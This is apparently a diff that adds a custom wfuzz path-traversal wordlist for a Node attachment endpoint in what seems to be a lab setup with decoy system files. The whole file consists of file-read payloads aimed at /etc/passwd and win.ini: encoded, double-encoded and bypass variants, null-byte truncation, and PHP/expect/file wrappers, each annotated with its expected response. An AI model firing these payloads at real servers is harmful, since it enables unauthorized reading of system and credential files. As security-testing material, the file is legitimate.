@@ -1,0 +1,71 @@
+# 針對 backend/routes/events.js 的 attachment sink 客製 wordlist
+# ATTACH_DIR = backend/data/attachments,decoy 在 backend/etc/passwd、backend/windows/win.ini(2 層深度)
+# 用法: wfuzz -c -z file,lfi_sink_traversal_wordlist.txt -u 'http://192.168.194.86:8080/api/events/1/attachment?file=FUZZ'
+#
+# 預期分三種真實回應(不是假的,都是這個 Node sink 實際會發生的行為):
+#   200 - 深度剛好對到 decoy,真的讀到檔案
+#   404 - 深度不對 / wrapper 語法 Node 不認得 / 檔案不存在
+#   500 - payload 含 null byte,fs.readFile 對嵌入 NUL 直接同步丟 ERR_INVALID_ARG_VALUE
+
+# ── 深度 2,應該 200(打中 backend/etc/passwd) ──
+../../etc/passwd
+..\..\etc\passwd
+../../etc\passwd
+..\..\/etc/passwd
+
+# ── 深度 2,應該 200(打中 backend/windows/win.ini) ──
+../../windows/win.ini
+..\..\windows\win.ini
+../../windows\win.ini
+..\..\/windows/win.ini
+
+# ── 錯誤深度,應該 404(真實 pentest 猜深度失敗的樣子) ──
+../etc/passwd
+etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../windows/win.ini
+../../../windows/win.ini
+../../../../windows/win.ini
+
+# ── 單層 URL 編碼,Express 會自動解碼成上面那些,應該一樣 200/404 ──
+..%2f..%2fetc%2fpasswd
+..%2F..%2Fetc%2Fpasswd
+..%5c..%5cwindows%5cwin.ini
+..%5C..%5Cwindows%5Cwin.ini
+%2e%2e/%2e%2e/etc/passwd
+%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e%5c%2e%2e%5cwindows%5cwin.ini
+
+# ── 雙重編碼(對應 spec has_double_encoding),Express 只解一層,
+#    剩下的 %2f 會變成檔名字面字元,預期一律 404,但這是正確且有意義的 miss ──
+..%252f..%252fetc%252fpasswd
+..%252F..%252Fetc%252Fpasswd
+%252e%252e%252f%252e%252e%252fetc%252fpasswd
+..%25322f..%25322fetc%25322fpasswd
+
+# ── 特殊 dot-slash 變形(常見繞過手法,對這個 sink 預期還是 404) ──
+....//....//etc/passwd
+....\/....\/etc/passwd
+..;/..;/etc/passwd
+..././..././etc/passwd
+
+# ── Null byte truncation,預期 500(fs.readFile 對 embedded NUL 同步丟錯,不是 404) ──
+../../etc/passwd%00
+../../etc/passwd%00.jpg
+poster.txt%00.png
+
+# ── PHP/RFI wrapper 語法,Node 原生不支援,預期一律 404 ──
+php://filter/convert.base64-encode/resource=../../etc/passwd
+php://filter/read=convert.base64-encode/resource=poster.txt
+data://text/plain;base64,Li4vLi4vZXRjL3Bhc3N3ZA==
+expect://cat ../../etc/passwd
+input://
+file://../../etc/passwd
+file:///etc/passwd
+
+# ── 合法對照(AMAN 基準,應該 200) ──
+poster.txt
+./poster.txt
+POSTER.TXT
